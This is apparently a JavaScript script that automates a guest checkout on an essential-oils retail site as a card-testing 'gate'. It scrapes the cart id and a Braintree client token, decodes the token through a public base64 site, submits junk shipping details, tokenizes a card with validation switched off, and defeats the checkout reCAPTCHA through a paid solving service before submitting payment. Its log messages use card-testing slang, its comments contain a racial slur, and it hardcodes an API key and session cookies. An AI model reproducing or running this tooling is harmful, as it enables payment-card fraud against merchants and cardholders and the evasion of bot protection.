import axios from 'axios';
import FormData from 'form-data';
import * as cheerio from 'cheerio';


const form = new FormData();
form.append('product', '44589');
form.append('uenc', 'aHR0cHM6Ly93d3cuYXVyYWNhY2lhLmNvbS9jaGVja291dC9jYXJ0L2FkZC91ZW5jL2FIUjBjSE02THk5M2QzY3VZWFZ5WVdOaFkybGhMbU52YlM5bGMzTmxiblJwWVd3dGIybHNjd35-L3Byb2R1Y3QvNDQ1ODkv');
form.append('qty', '1');
form.append('form_key', 'nT68RVhJVPjj4QgH');

const req1 = await axios.post(
  'https://www.auracacia.com/checkout/cart/add/uenc/aHR0cHM6Ly93d3cuYXVyYWNhY2lhLmNvbS9lc3NlbnRpYWwtb2lscw~~/product/44589/',
  form,
  {
    headers: {
      ...form.getHeaders(),
      'authority': 'www.auracacia.com',
      'accept': 'application/json, text/javascript, */*; q=0.01',
      'accept-language': 'es-US,es-419;q=0.9,es;q=0.8',
      'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryRgBWHNVhYmH42MIY',
      'cookie': 'PHPSESSID=e84320486dd24e526e0b6022711f11f2; form_key=nT68RVhJVPjj4QgH; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-banners-cache-storage={}; mage-messages=; form_key=nT68RVhJVPjj4QgH; X-Magento-Vary=43249eb2bcfccaffbaffd1ac5c3038d1bffe74b516ef10be18e72e89f46af134; hblid=xFSe7dENreezuCTo9O5LQ0W0bo5Bra0d; _okdetect=%7B%22token%22%3A%2217519040992710%22%2C%22proto%22%3A%22about%3A%22%2C%22host%22%3A%22%22%7D; _ok=8164-882-10-5249; _fbp=fb.1.1751904106122.421745183543551963; cookieyes-consent=consentid:SDRQYzJBSlpIZWhMcWg5YXVBUG1wM2tnWW93dnZUVzk,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes; _gcl_au=1.1.1323402339.1751904110; _ga=GA1.1.981651860.1751904110; lux_uid=175190411365494416; _pin_unauth=dWlkPU9XWTNZMk5oTmpndFpUSmlZUzAwWkRZMkxXRTBPR0l0TkROaU9XRTRNVGczWVRkaw; wcsid=F7HSLCVlXlcaiaLo9O5LQ0W02b0dzrBO; __exponea_etc__=cd925222-f055-48f1-8b24-444159e97b17; olfsk=olfsk9083324591911124; _okbk=cd5%3Davailable%2Ccd4%3Dtrue%2Cvi5%3D0%2Cvi4%3D1751904116555%2Cvi3%3Dactive%2Cvi2%3Dfalse%2Cvi1%3Dfalse%2Ccd8%3Dchat%2Ccd6%3D0%2Ccd3%3Dfalse%2Ccd2%3D0%2Ccd1%3D0%2C; __exponea_time2__=0.08501648902893066; klv_mage={"expire_sections":{"customerData":1751904719}}; _oklv=1751904120757%2CF7HSLCVlXlcaiaLo9O5LQ0W02b0dzrBO; _ga_E899ML2BST=GS2.1.s1751904110$o1$g1$t1751904121$j49$l0$h927148421; _uetsid=aa7644905b4b11f08048299fddb22d8a; _uetvid=aa7755605b4b11f08b0c036211b5e8cc',
      'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI2MjIwODAiLCJhcCI6IjE4MzUwMDkwMTQiLCJpZCI6ImM5MTE5ODE1MThkZGViMjEiLCJ0ciI6IjIyMjczNWE0MDRiZTQwMTFiMDczYTYxNThjNmQ0MDI4IiwidGkiOjE3NTE5MDQxMzMyNzAsInRrIjoiMTMyMjg0MCJ9fQ==',
      'origin': 'https://www.auracacia.com',
      'referer': 'https://www.auracacia.com/essential-oils',
      'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Linux"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'traceparent': '00-222735a404be4011b073a6158c6d4028-c911981518ddeb21-01',
      'tracestate': '1322840@nr=0-1-2622080-1835009014-c911981518ddeb21----1751904133270',
      'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
      'x-newrelic-id': 'VgAFU1ZbCBABUlJRAAQOUF0H',
      'x-requested-with': 'XMLHttpRequest'
    }
  }
);

const cookies = req1.headers['set-cookie']

const req2 = await axios.get('https://www.auracacia.com/checkout/', {
  headers: {
    'authority': 'www.auracacia.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'es-US,es-419;q=0.9,es;q=0.8',
    'cookie': cookies,
    'referer': 'https://www.auracacia.com/checkout/cart/',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36'
  }
});

var entityId = null;
const entityRegex = /"entity_id":"([A-Za-z0-9]{20,40})"/;
const match = req2.data.match(entityRegex);
if (match) {
   entityId = match[1];
    console.log("Found entity_id:", entityId)}

const clientTokenRegex = /"clientToken":"([^"]+)"/;
const match2 = req2.data.match(clientTokenRegex);

if (match2) {
    var clientToken = match2[1];
    console.log('Client Token:');
} else {
    console.log('#DEAD GATE');
};

const req3 = await axios.post(
  'https://base64.guru/converter/decode',
  new URLSearchParams({
    'form_is_submited': 'base64-converter-decode',
    'form_action_url': '/converter/decode',
    'base64': clientToken,
    'standard': 'auto',
    'strict': 'no',
    'charset': 'auto',
    'decode': '1'
  }),
  {
    headers: {
      'authority': 'base64.guru',
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
      'accept-language': 'es-US,es-419;q=0.9,es;q=0.8',
      'cache-control': 'max-age=0',
      'cookie': '_ga_TLCQZ9XPCE=GS2.1.s1751906194$o1$g0$t1751906194$j60$l0$h0; _ga=GA1.2.452759792.1751906195; _gid=GA1.2.605955575.1751906195; _gat_gtag_UA_134607367_1=1; FCNEC=%5B%5B%22AKsRol-CsIit0AlQg61UTMwOnjFElXLtDjxDqBSWxXSQrQnQjHEHvfhDggJR1-RfBcShZzn-HPIqOy94JS7z04N5a19w-LH2uuYPW55XiJ2wRJ2uMeMsNqFMJagQ2QtAIa1UFjOW_Z4Hrzck_ch-F4pRRNwqFersAg%3D%3D%22%5D%5D',
      'origin': 'https://base64.guru',
      'referer': 'https://base64.guru/converter/decode',
      'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Linux"',
      'sec-fetch-dest': 'document',
      'sec-fetch-mode': 'navigate',
      'sec-fetch-site': 'same-origin',
      'sec-fetch-user': '?1',
      'upgrade-insecure-requests': '1',
      'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36'
    }
  }
);

const authFingerprintRegex = /"authorizationFingerprint":"([^"]+)"/;
const match3 = req3.data.match(authFingerprintRegex);

if (match3) {
    var fingerprint = match3[1];
    console.log('Authorization Fingerprint:', fingerprint);
} else {
    console.log('Dead Asss');
}

// SEPARATOR NIGGEST


const req4 = await axios.post(
  `https://www.auracacia.com/rest/auracacia_english/V1/guest-carts/${entityId}/shipping-information`,
  {
    'addressInformation': {
      'shipping_address': {
        'countryId': 'US',
        'regionId': '43',
        'regionCode': 'NY',
        'region': 'New York',
        'street': [
          'Street 7',
          ''
        ],
        'company': '',
        'telephone': '6001117999',
        'postcode': '11223',
        'city': 'Brooklyn',
        'firstname': 'Skakaaksk',
        'lastname': 'Kkkkkkkk'
      },
      'billing_address': {
        'countryId': 'US',
        'regionId': '43',
        'regionCode': 'NY',
        'region': 'New York',
        'street': [
          'Street 7',
          ''
        ],
        'company': '',
        'telephone': '6001117999',
        'postcode': '11223',
        'city': 'Brooklyn',
        'firstname': 'Skakaaksk',
        'lastname': 'Kkkkkkkk',
        'saveInAddressBook': null
      },
      'shipping_method_code': 'FXGR',
      'shipping_carrier_code': 'rateshopper',
      'extension_attributes': {}
    }
  },
  {
    headers: {
      'authority': 'www.auracacia.com',
      'accept': '*/*',
      'accept-language': 'es-US,es-419;q=0.9,es;q=0.8',
      'content-type': 'application/json',
      'cookie': cookies,
      'origin': 'https://www.auracacia.com',
      'referer': 'https://www.auracacia.com/checkout/',
      'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Linux"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
      'x-requested-with': 'XMLHttpRequest'
    }
  }
);
console.log("Selected! Big Ass")


const req5 = await axios.post(
  'https://payments.braintree-api.com/graphql',
  {
    'clientSdkMetadata': {
      'source': 'client',
      'integration': 'custom',
      'sessionId': '5400f7e8-3f70-418d-9e7c-46181d2d1c57'
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
      'input': {
        'creditCard': {
          'number': '4242424242424242',
          'expirationMonth': '12',
          'expirationYear': '2025',
          'cvv': '123'
        },
        'options': {
          'validate': false
        }
      }
    },
    'operationName': 'TokenizeCreditCard'
  },
  {
    headers: {
      'authority': 'payments.braintree-api.com',
      'accept': '*/*',
      'accept-language': 'es-US,es-419;q=0.9,es;q=0.8',
      'authorization': `Bearer ${fingerprint}`,
      'braintree-version': '2018-05-10',
      'content-type': 'application/json',
      'origin': 'https://assets.braintreegateway.com',
      'referer': 'https://assets.braintreegateway.com/',
      'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Linux"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'cross-site',
      'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36'
    }
  }
);

var nonce = req5.data.data.tokenizeCreditCard.token;
console.log(nonce)

// penesito

export async function resolverCaptcha(apiKey, siteKey = '6LcBW0MrAAAAAIrfyTAbMZoVGURuvvjYbdC19ts8', pageUrl = 'https://www.auracacia.com/checkout/') {
    try {
        console.log("🤖 Solving captcha...");

        // Enviar captcha
        const requestUrl = `https://api.solvecaptcha.com/in.php?key=${apiKey}&method=userrecaptcha&googlekey=${siteKey}&pageurl=${pageUrl}`;
        const requestResponse = await axios.get(requestUrl);
        
        if (!requestResponse.data.startsWith('OK|')) {
            throw new Error(`Error: ${requestResponse.data}`);
        }

        const taskId = requestResponse.data.substring(3);
        console.log(`📋 Task ID: ${taskId}`);

        // Esperar resultado
        for (let i = 0; i < 30; i++) {
            await new Promise(r => setTimeout(r, 5000));
            
            const resultUrl = `https://api.solvecaptcha.com/res.php?key=${apiKey}&action=get&id=${taskId}`;
            const resultResponse = await axios.get(resultUrl);
            
            if (resultResponse.data.startsWith('OK|')) {
                const token = resultResponse.data.substring(3);
                console.log('✅ Captcha resuelto');
                return token;
            } else if (resultResponse.data !== "CAPCHA_NOT_READY") {
                throw new Error(`Error: ${resultResponse.data}`);
            }
            
            console.log(`⏳ Intento ${i + 1}/30`);
        }
        
        throw new Error("Timeout");
    } catch (error) {
        console.log(`❌ Error: ${error.message}`);
        return null;
    }
}

var token = await resolverCaptcha('29a3424dff1bd989a2835dc9eddf3efd');

// FINAL BUEN NIGGA

const req7 = await axios.post(
  `https://www.auracacia.com/rest/auracacia_english/V1/guest-carts/${entityId}/payment-information`,
  {
    'cartId': entityId,
    'billingAddress': {
      'countryId': 'US',
      'regionId': '43',
      'regionCode': 'NY',
      'region': 'New York',
      'street': [
        'Street 7',
        ''
      ],
      'company': '',
      'telephone': '6001117999',
      'postcode': '11223',
      'city': 'Brooklyn',
      'firstname': 'Skakaaksk',
      'lastname': 'Kkkkkkkk',
      'saveInAddressBook': null
    },
    'paymentMethod': {
      'method': 'braintree',
      'additional_data': {
        'payment_method_nonce': nonce,
        'device_data': '{"correlation_id":"5400f7e8-3f70-418d-9e7c-46181d2d"}'
      },
      'extension_attributes': {}
    },
    'email': 'kskssksk@gmail.com'
  },
  {
    headers: {
      'authority': 'www.auracacia.com',
      'accept': '*/*',
      'accept-language': 'es-US,es-419;q=0.9,es;q=0.8',
      'content-type': 'application/json',
      'cookie': cookies,
      'origin': 'https://www.auracacia.com',
      'referer': 'https://www.auracacia.com/checkout/',
      'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Linux"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
      'x-recaptcha': token,
      'x-requested-with': 'XMLHttpRequest'
    }
  }
);

console.log(req7.data)